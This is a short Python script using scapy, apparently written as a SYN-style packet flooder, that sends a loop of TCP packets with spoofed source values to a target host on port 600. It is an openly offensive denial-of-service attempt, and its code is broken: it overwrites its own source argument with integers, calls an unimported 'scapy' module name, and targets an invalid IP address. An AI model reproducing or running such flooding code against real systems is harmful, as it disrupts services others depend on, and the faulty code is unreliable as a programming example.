from scapy.all import *

def flood(source, target):
    for source in range(100, 150):
        IPLayer = scapy.IP(src=source, dst=target)
        TCPLayer = scapy.TCP(sport=source, dport=600)
        pkt = IPLayer/TCPLayer
        send(pkt)
    
source = "127.0.0.1"
target = "162.323.23.323"

flood(source, target)